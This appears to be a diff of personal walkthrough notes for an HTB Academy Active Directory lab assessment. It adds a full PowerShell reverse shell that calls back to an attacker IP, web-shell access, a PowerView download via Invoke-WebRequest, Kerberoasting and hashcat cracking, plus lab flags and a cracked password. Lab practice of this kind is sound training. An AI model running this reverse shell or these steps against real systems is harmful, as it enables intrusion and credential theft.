@@ -6,32 +6,54 @@ Apply what you learned in this module to compromise the domain and answer the qu
 xfreerdp /v:10.129.2.44 /u:htb-student /p:HTB_@cademy_stdnt! /drive:shared,/home/htb-ac-1235531/Desktop
 
 
-Question 1 - 
+$client = New-Object System.Net.Sockets.TCPClient('10.10.14.128',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+
+Question 1 - Submit the contents of the flag.txt file on the administrator Desktop of the web server - JusT_g3tt1ng_st@rt3d!
+1) go to http://10.129.202.242/uploads/antak.aspx 
+2) login with provided creds 
+3) revsheslls.com -> powershell reverse shell to copy into webshell we logged into 
+4) nc -nlvp 4445 on host machine 
+5) get connection
+6) cd C:\Users\Administrator\Desktop 
+7) get-content flag.txt - JusT_g3tt1ng_st@rt3d!
+ 
+
+
+Question 2 - Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer - svc_sql
+1) on Host machine run sudo mv /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 . to move poweview to desktop
+2) python3 -m http.server 
+3) ON REVERSEHLLLLL -> Invoke-WebRequest -URI "http://10.10.14.128:8000/PowerView.ps1" -OutFile ./PowerView.ps1 
+4) ON REVERSE SHELL -> Import-Module ./PowerView.ps1
+5) ON REVERSE SHELL -> Get-NetUser -SPN | select name,samaccountname,serviceprincipalname,description
+6) OutPut: svc_sql      svc_sql        MSSQLSvc/SQL01.inlanefreight.local:1433                                            
+ 
 
 
 
-Question 2 - 
+
+
+Question 3 - Crack the account's password. Submit the cleartext value.
+1) Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+2) Get-Content ilfreight_tgs.csv
+3) copy and paste all output to note ( or just svbc_sql) 
+4) hashcat -m 13100 sqlhash /usr/share/wordlists/rockyou.txt 
+5) output of cracked hash = lucky7 
+
+
+Question 4 -  Submit the contents of the flag.txt file on the Administrator desktop on MS01
 
 
 
-
-Question 3 - 
-
-
-
-Question 4 - 
+Question 5 - Find cleartext credentials for another domain user. Submit the username as your answer.
 
 
 
-Question 5 - 
+Question 6 -  Submit this user's cleartext password.
 
 
 
-Question 6 - 
-
-
-
-Question 7 - 
+Question 7 -  Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01
 
 
 
